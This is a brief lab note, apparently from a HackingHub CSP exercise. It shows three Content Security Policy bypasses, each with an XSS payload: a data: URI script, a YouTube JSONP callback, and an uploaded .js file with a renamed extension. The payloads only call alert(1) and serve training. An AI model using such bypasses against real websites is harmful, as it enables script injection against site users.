# CSP (HackingHub)

Content Security Policy
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
## Data

```text
content-security-policy
	script-src 'self' https://app.hackinghub.io data:
```

```html
<script src=data:text/javascript,alert(1)></script>
```

## 3rd Party Domains JSONP

```text
content-security-policy
	script-src 'self' https://app.hackinghub.io https://www.google.com https://www.youtube.com
```


```html
<script/src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=oOfgVmxBk6U&callback=alert(1)></script>
```

## CSP Upload Bypass

```text
Content-Security-Policy
	script-src 'self'
```

![Pasted image 20241122125841.png](../../assets/images/bc0eb0fff7e61d940dfb.png)

Change file extension

![Pasted image 20241122130236.png](../../assets/images/6d83f84c2722f2f06a3e.png)

```text
https://1972wbae.eu1.ctfio.com/csp-upload/uploads/602f749c1107ef174ee59af635d096ef.js
```

```html
<script/src=https://1972wbae.eu1.ctfio.com/csp-upload/uploads/602f749c1107ef174ee59af635d096ef.js></script>
```
